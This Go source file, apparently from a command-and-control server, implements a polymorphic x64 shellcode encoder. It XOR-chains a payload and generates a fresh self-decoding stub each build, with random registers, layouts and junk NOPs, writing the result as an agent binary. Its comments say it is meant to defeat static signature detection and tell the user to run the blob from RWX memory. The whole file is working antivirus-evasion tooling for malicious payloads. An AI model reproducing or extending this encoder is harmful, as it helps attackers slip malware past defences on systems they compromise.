package server

// Polymorphic SGN-style x64 shellcode encoder.
//
// Encoding: XOR with key chaining (each dword's encoded value becomes the next key).
//   enc[i] = plain[i] ^ key;  key = enc[i]
//
// Decode stub (generated fresh each build):
//   - 4 randomly-chosen GP registers (ptr, key, cnt, tmp)
//   - 2 layout variants (CALL/POP before or after register setup)
//   - Random NOP-equivalent junk injected at multiple points
//   - 32-bit key is unique per build
//
// Output layout: [poly_stub][encoded_payload]
// The stub is position-independent; run the output blob as shellcode.

import (
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"path/filepath"
)

// ---------------------------------------------------------------------------
// Random helpers
// ---------------------------------------------------------------------------

func polyRandBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b) //nolint:errcheck
	return b
}

func polyRandU32() uint32 {
	return binary.LittleEndian.Uint32(polyRandBytes(4))
}

// polyRandN returns a value in [0, n). Bias is negligible for small n.
func polyRandN(n int) int {
	if n <= 1 {
		return 0
	}
	return int(polyRandBytes(1)[0]) % n
}

// polyRandPerm returns a random permutation of indices [0, n).
func polyRandPerm(n int) []int {
	p := make([]int, n)
	for i := range p {
		p[i] = i
	}
	for i := n - 1; i > 0; i-- {
		j := polyRandN(i + 1)
		p[i], p[j] = p[j], p[i]
	}
	return p
}

// ---------------------------------------------------------------------------
// x64 register definitions (low registers only — no REX.B needed for rm field)
// Excludes RSP (4) and RBP (5) to avoid SIB/RIP-relative edge cases.
// ---------------------------------------------------------------------------

type polyReg struct {
	name    string
	code    byte // ModRM rm/reg field (0–7)
	popByte byte // POP r64 opcode  (0x58 + rd)
	movByte byte // MOV r32,imm32 opcode (0xB8 + rd)
}

var polyRegPool = []polyReg{
	{"rax", 0, 0x58, 0xB8},
	{"rcx", 1, 0x59, 0xB9},
	{"rdx", 2, 0x5A, 0xBA},
	{"rbx", 3, 0x5B, 0xBB},
	{"rsi", 6, 0x5E, 0xBE},
	{"rdi", 7, 0x5F, 0xBF},
}

// ---------------------------------------------------------------------------
// x64 instruction emitters
// All correctness notes reference Intel Vol.2 encoding.
// ---------------------------------------------------------------------------

func le32b(v uint32) []byte {
	b := make([]byte, 4)
	binary.LittleEndian.PutUint32(b, v)
	return b
}

// CALL $+5 ; POP reg
// After execution: reg = address of the POP instruction.
// CALL $+5: E8 00 00 00 00  (rel32=0 → jumps to next byte = POP)
func iCallPop(r polyReg) []byte {
	return []byte{0xE8, 0x00, 0x00, 0x00, 0x00, r.popByte}
}

// MOV r32, imm32  — zero-extends to 64-bit (no REX needed)
func iMovR32Imm(r polyReg, v uint32) []byte {
	return append([]byte{r.movByte}, le32b(v)...)
}

// ADD reg64, imm32  (REX.W 81 /0)
// ModRM: mod=11, reg=0 (/0), rm=r.code → 0xC0 | r.code
func iAddR64Imm32(r polyReg, v uint32) []byte {
	return append([]byte{0x48, 0x81, 0xC0 | r.code}, le32b(v)...)
}

// ADD reg64, imm8  (REX.W 83 /0 ib)
func iAddR64Imm8(r polyReg, v byte) []byte {
	return []byte{0x48, 0x83, 0xC0 | r.code, v}
}

// SUB reg64, imm32  (REX.W 81 /5)
// ModRM for /5 group: mod=11, reg=5 (101b), rm=r.code → 0xE8 | r.code
func iSubR64Imm32(r polyReg, v uint32) []byte {
	return append([]byte{0x48, 0x81, 0xE8 | r.code}, le32b(v)...)
}

// MOV r32, [base64]  — opcode 8B /r, mod=00
// Safe when base.code ∉ {4,5} (RSP/RBP excluded from polyRegPool).
func iMovR32Mem(dst, base polyReg) []byte {
	return []byte{0x8B, (dst.code << 3) | base.code}
}

// MOV r32, r32  (8B /r, mod=11)
func iMovR32R32(dst, src polyReg) []byte {
	return []byte{0x8B, 0xC0 | (dst.code << 3) | src.code}
}

// XOR [base64], r32  — opcode 31 /r, mod=00
// Decodes the dword in-place: MEM[base] ^= r.
func iXorMemR32(base, src polyReg) []byte {
	return []byte{0x31, (src.code << 3) | base.code}
}

// DEC r32  (FF /1, mod=11)
// ModRM: mod=11 (11b), reg=1 (/1 = 001b), rm=r.code → 0xC8 | r.code
func iDecR32(r polyReg) []byte {
	return []byte{0xFF, 0xC8 | r.code}
}

// JNZ rel8
func iJnz(rel int8) []byte {
	return []byte{0x75, byte(rel)}
}

// JMP r/m64  (FF /4, mod=11)
// ModRM: mod=11 (11b), reg=4 (/4 = 100b), rm=r.code → 0xE0 | r.code
// 64-bit operand size is the default in 64-bit mode for this encoding.
func iJmpR64(r polyReg) []byte {
	return []byte{0xFF, 0xE0 | r.code}
}

// ---------------------------------------------------------------------------
// Junk (semantically inert) instruction pool
// Only NOP-class instructions — safe inside loops, no register side-effects.
// ---------------------------------------------------------------------------

var polyJunkPool = [][]byte{
	{0x90},                               // NOP
	{0x66, 0x90},                         // NOP (operand-size prefix)
	{0x48, 0x90},                         // XCHG RAX,RAX (multi-byte NOP)
	{0x0F, 0x1F, 0x00},                   // NOP DWORD PTR [RAX]
	{0x0F, 0x1F, 0x40, 0x00},             // NOP DWORD PTR [RAX+0]
	{0x0F, 0x1F, 0x44, 0x00, 0x00},       // NOP DWORD PTR [RAX+RAX*1+0]
	{0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00}, // NOP WORD  PTR [RAX+RAX*1+0]
	{0x2E, 0x90},                         // CS: NOP
	{0x3E, 0x90},                         // DS: NOP
}

func polyJunk() []byte {
	count := 1 + polyRandN(3)
	var b []byte
	for i := 0; i < count; i++ {
		b = append(b, polyJunkPool[polyRandN(len(polyJunkPool))]...)
	}
	return b
}

// ---------------------------------------------------------------------------
// Decode loop builder
//
// Registers:
//   ptrReg — points to current encoded dword (advanced by 4 each iteration)
//   keyReg — holds current XOR key (updated to prev encoded dword each iter)
//   cntReg — loop counter (decremented, checked with JNZ)
//   tmpReg — scratch: saves encoded value before in-place XOR
//
// Per-iteration logic:
//   tmpReg = *ptrReg          // save encoded dword
//   *ptrReg ^= keyReg         // decode in-place
//   keyReg = tmpReg           // key chains to encoded value
//   ptrReg += 4
//   cntReg--
//   jnz loop_start
// ---------------------------------------------------------------------------

func buildDecodeLoop(ptrReg, keyReg, cntReg, tmpReg polyReg) []byte {
	var body []byte

	if polyRandN(2) == 0 {
		body = append(body, polyJunk()...)
	}

	body = append(body, iMovR32Mem(tmpReg, ptrReg)...)  // MOV tmp32, [ptr]
	body = append(body, iXorMemR32(ptrReg, keyReg)...)  // XOR [ptr], key32
	body = append(body, iMovR32R32(keyReg, tmpReg)...)  // MOV key32, tmp32
	body = append(body, iAddR64Imm8(ptrReg, 4)...)      // ADD ptr, 4

	if polyRandN(3) == 0 {
		body = append(body, polyJunk()...)
	}

	body = append(body, iDecR32(cntReg)...)             // DEC cnt32
	// JNZ target = start of loop; rel8 = -(len(body)+2)
	rel := -(len(body) + 2)
	body = append(body, iJnz(int8(rel))...)

	return body
}

// ---------------------------------------------------------------------------
// Decode stub generation
//
// Layout 0 — CALL/POP then setup:
//   CALL $+5 ; POP ptrReg          (6 bytes)
//   [junk]
//   MOV keyReg32, key              (5 bytes)  ─┐ order randomised
//   MOV cntReg32, count            (5 bytes)  ─┘
//   [junk]
//   ADD ptrReg, <offset>           (7 bytes)
//   [decode loop]
//   SUB ptrReg, payloadLen         (7 bytes)
//   JMP ptrReg                     (2 bytes)
//   [encoded payload follows immediately]
//
// Layout 1 — setup then CALL/POP:
//   [junk]
//   MOV keyReg32, key
//   MOV cntReg32, count
//   [junk]
//   CALL $+5 ; POP ptrReg
//   [junk]
//   ADD ptrReg, <offset>
//   [decode loop]
//   SUB ptrReg, payloadLen
//   JMP ptrReg
//   [encoded payload follows immediately]
// ---------------------------------------------------------------------------

func genPolyStub(key uint32, payloadLen int) ([]byte, error) {
	if payloadLen == 0 || payloadLen%4 != 0 {
		return nil, errors.New("poly: payload length must be a positive multiple of 4")
	}
	dwords := uint32(payloadLen / 4)

	// Pick 4 distinct registers
	perm := polyRandPerm(len(polyRegPool))
	ptrReg := polyRegPool[perm[0]]
	keyReg := polyRegPool[perm[1]]
	cntReg := polyRegPool[perm[2]]
	tmpReg := polyRegPool[perm[3]]

	// Build fixed-size pieces first
	loop   := buildDecodeLoop(ptrReg, keyReg, cntReg, tmpReg)
	epilog := append(iSubR64Imm32(ptrReg, uint32(payloadLen)), iJmpR64(ptrReg)...)

	// Setup block (MOV key + MOV cnt, order randomised)
	movKey := iMovR32Imm(keyReg, key)
	movCnt := iMovR32Imm(cntReg, dwords)
	var setup []byte
	if polyRandN(2) == 0 {
		setup = append(movKey, movCnt...)
	} else {
		setup = append(movCnt, movKey...)
	}

	const addSize = 7 // ADD reg64, imm32 is always 7 bytes

	layout := polyRandN(2)
	var stub []byte

	switch layout {
	case 0:
		// CALL/POP is at byte 0 of stub; ptrReg = &stub[5] (address of POP opcode).
		// Encoded data begins at: &stub[5] + 1 + junk1 + setup + junk2 + addSize + loop + epilog
		junk1 := polyJunk()
		junk2 := polyJunk()
		offset := uint32(1 + len(junk1) + len(setup) + len(junk2) + addSize + len(loop) + len(epilog))
		add := iAddR64Imm32(ptrReg, offset)

		stub = append(stub, iCallPop(ptrReg)...)
		stub = append(stub, junk1...)
		stub = append(stub, setup...)
		stub = append(stub, junk2...)
		stub = append(stub, add...)
		stub = append(stub, loop...)
		stub = append(stub, epilog...)

	case 1:
		// CALL/POP comes after setup. ptrReg = &POP_byte.
		// Encoded data begins at: &POP_byte + 1 + junk3 + addSize + loop + epilog
		junk1 := polyJunk()
		junk2 := polyJunk()
		junk3 := polyJunk()
		offset := uint32(1 + len(junk3) + addSize + len(loop) + len(epilog))
		add := iAddR64Imm32(ptrReg, offset)

		stub = append(stub, junk1...)
		stub = append(stub, setup...)
		stub = append(stub, junk2...)
		stub = append(stub, iCallPop(ptrReg)...)
		stub = append(stub, junk3...)
		stub = append(stub, add...)
		stub = append(stub, loop...)
		stub = append(stub, epilog...)
	}

	return stub, nil
}

// ---------------------------------------------------------------------------
// Payload encoder: XOR with key chaining
//
// enc[i] = plain[i] ^ key;  key = enc[i]
//
// Decode: tmp = enc[i]; plain[i] = tmp ^ key; key = tmp
// The in-place decode stub does exactly this using tmpReg.
// ---------------------------------------------------------------------------

func polyEncodePayload(payload []byte, key uint32) []byte {
	out := make([]byte, len(payload))
	k := key
	for i := 0; i < len(payload); i += 4 {
		p := binary.LittleEndian.Uint32(payload[i : i+4])
		e := p ^ k
		binary.LittleEndian.PutUint32(out[i:i+4], e)
		k = e // chain: next key = this encoded dword
	}
	return out
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

// PolyEncode wraps raw x64 shellcode with a polymorphic self-decoding stub.
// Every call produces a unique binary: different registers, different junk,
// different layout, different key — no static byte signature is possible.
//
// The returned blob is position-independent shellcode: allocate RWX memory,
// copy the blob in, and execute from byte 0.
func PolyEncode(payload []byte) ([]byte, error) {
	// Pad to dword boundary with NOP so the encoder works in 4-byte chunks.
	for len(payload)%4 != 0 {
		payload = append(payload, 0x90)
	}

	key     := polyRandU32()
	encoded := polyEncodePayload(payload, key)

	stub, err := genPolyStub(key, len(encoded))
	if err != nil {
		return nil, err
	}

	out := make([]byte, len(stub)+len(encoded))
	copy(out, stub)
	copy(out[len(stub):], encoded)
	return out, nil
}

// PolyEncodeFile reads a raw shellcode .bin, applies PolyEncode, and writes
// the result as agent_enc_poly.bin in outDir. Returns the output path.
func PolyEncodeFile(binPath, outDir string) (string, error) {
	data, err := os.ReadFile(binPath)
	if err != nil {
		return "", fmt.Errorf("poly: read bin: %w", err)
	}
	encoded, err := PolyEncode(data)
	if err != nil {
		return "", err
	}
	outPath := filepath.Join(outDir, "agent_enc_poly.bin")
	if err := os.WriteFile(outPath, encoded, 0644); err != nil {
		return "", fmt.Errorf("poly: write: %w", err)
	}
	return outPath, nil
}
